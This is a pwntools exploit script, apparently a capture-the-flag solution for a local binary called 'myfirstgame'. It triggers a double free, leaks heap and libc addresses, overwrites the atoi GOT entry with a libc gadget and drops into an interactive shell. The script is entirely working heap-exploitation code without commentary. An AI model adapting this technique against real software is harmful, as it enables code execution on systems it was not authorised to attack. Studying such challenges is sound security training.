from pwn import *
elf = ELF('./myfirstgame', checksec=False)
libc = ELF('./libc/libc6_2.28-0ubuntu1_amd64.so', checksec=False)

def reset():
    p.sendlineafter(b'>>', b'5')
def get_info():
    p.sendlineafter(b'>>', b'4')
    name = p.recvline_contains(':').strip()[6:]
    damage = p.recvline_contains(':').strip()[13:]
    return b'%s|%s' % (name,damage)
def set_name(data):
    p.sendlineafter(b'>>', b'1')
    p.sendlineafter(b'name:', b'%s' % data)

def set_damage(data):
    p.sendlineafter(b'>>', b'2')
    p.sendlineafter(b'damage:', b'%s' % data)
    
p = elf.process()

set_name(p64(0)*2+p64(elf.sym['name'])+p64(0)*5+p64(elf.got['atoi']))
set_damage(b'A'*8)

reset() # double free
reset()

heap = u64(get_info().decode('cp1252').split('|')[1].ljust(8, '\x00')) - 16
pname = heap - 0x1010 + (0x10*2)
patoi = pname + (0x10*3)
log.info('heap 0x%x'%heap)
log.info('name pointer 0x%x'%pname)
log.info('atoi pointer 0x%x'%patoi)


set_name(p64(pname))
set_name(b'B'*8)

set_name(b'C'*8)
set_name(p64(patoi))

set_name(p64(pname+24))

libc.address = u64(get_info().decode('latin-1').split('|')[0].ljust(8, '\x00')) - (libc.sym['_IO_default_uflow']+50)
log.info('base 0x%x'%libc.address)

set_name(b'AAAAFFFF')
set_name(b'AAAAPPPP')
set_damage(p64(libc.address + 0x103f50)+p64(libc.sym['__isoc99_scanf']))
set_damage(b'0')
p.interactive()
